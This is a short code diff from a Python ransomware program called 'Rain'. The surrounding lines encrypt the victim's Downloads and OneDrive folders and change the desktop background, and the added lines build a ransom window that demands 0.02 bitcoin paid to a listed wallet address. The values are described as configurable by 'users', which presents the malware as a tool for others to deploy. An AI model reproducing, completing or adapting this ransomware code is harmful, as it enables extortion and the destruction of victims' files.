@@ -8,7 +8,9 @@ from os import getenv, chdir, system
 from os.path import expanduser
 from string import ascii_uppercase
 from shutil import copyfile
-from sys import argv
+from sys import argv, path
+path.append('..')
+from GUI.Interface import GUI
 
 """ ABOUT VARIABLES TO BE DECLARED
 
@@ -384,6 +386,17 @@ crypto.crypt_directory(downloads)
 crypto.crypt_directory(onedrive)
 
 crypto.change_background(appdata)
+
+""" Instance of the GUI class, this class coming from the interface part of the program
+    Name used for Ransomware - Rain
+    Amount to be paid (in bitcoins) - 0.02
+    Wallet to be paid - 18mB1n8bDXHxie9R4qAqHibUppaiwuQYXK
+    Path to the window icon - ../Util/rainicon.ico
+    
+    All of these values are examples and can be set by users.
+"""
+
+window = GUI('Rain', 0.02, '18mB1n8bDXHxie9R4qAqHibUppaiwuQYXK', '../Util/rainicon.ico')
 
 """ This structure is for encrypting each storage device connected to the machine 
     (USB sticks, external hard drives and hard drives (external or not) )
